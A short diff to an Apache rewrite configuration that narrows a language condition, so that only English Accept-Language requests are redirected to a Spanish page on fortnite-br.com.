@@ -1,4 +1,4 @@
 
 RewriteEngine on
-RewriteCond %{HTTP:Accept-Language} (en|es) [NC]
+RewriteCond %{HTTP:Accept-Language} (en) [NC]
 RewriteRule .* https://fortnite-br.com/es/ [L]
